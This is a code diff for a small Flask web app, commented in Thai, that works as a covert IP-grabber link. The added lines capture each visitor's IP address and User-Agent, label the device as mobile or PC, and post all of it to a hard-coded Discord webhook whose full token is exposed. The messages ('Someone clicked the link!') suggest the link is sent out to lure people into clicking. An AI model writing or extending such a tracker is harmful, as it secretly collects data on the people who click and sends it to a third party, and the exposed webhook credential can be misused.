@@ -3,20 +3,29 @@ import requests
 
 app = Flask(__name__)
 
+# ใส่ Webhook URL ของคุณที่นี่
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1302448307775471646/v4lagRRls5NHggJWwlaWPfIpsz3isk0xLeYG7bECQl799ijnAkHECqgIq4GfT2_Lrxgk"
 
 @app.route("/", methods=["GET"])
 def send_ip():
-    user_ip = request.remote_addr  # ดึง IP ของผู้ใช้
+    user_ip = request.remote_addr  # รับ IP ของผู้ใช้
+    user_agent = request.headers.get("User-Agent")  # ดึงข้อมูล User-Agent
+
+    # ตรวจสอบว่า User-Agent มาจาก PC หรือมือถือ
+    if "Mobile" in user_agent:
+        device_type = "Mobile"
+    else:
+        device_type = "PC"
+
+    # ข้อมูลที่จะส่งไปยัง Discord
     payload = {
-        "content": f"Someone clicked the link! IP: {user_ip}"
+        "content": f"Someone clicked the link! IP: {user_ip}, Device: {device_type}, User-Agent: {user_agent}"
     }
     try:
-        # ส่งข้อมูลไปที่ Webhook
+        # ส่งข้อมูลไปที่ Discord Webhook
         response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
-        # ตรวจสอบว่าการส่งสำเร็จหรือไม่
         if response.status_code == 204:
-            return "IP captured and sent to Discord!", 200
+            return "IP and device info captured and sent to Discord!", 200
         else:
             return f"Failed to send to Discord. Error: {response.status_code}, {response.text}", 500
     except Exception as e:
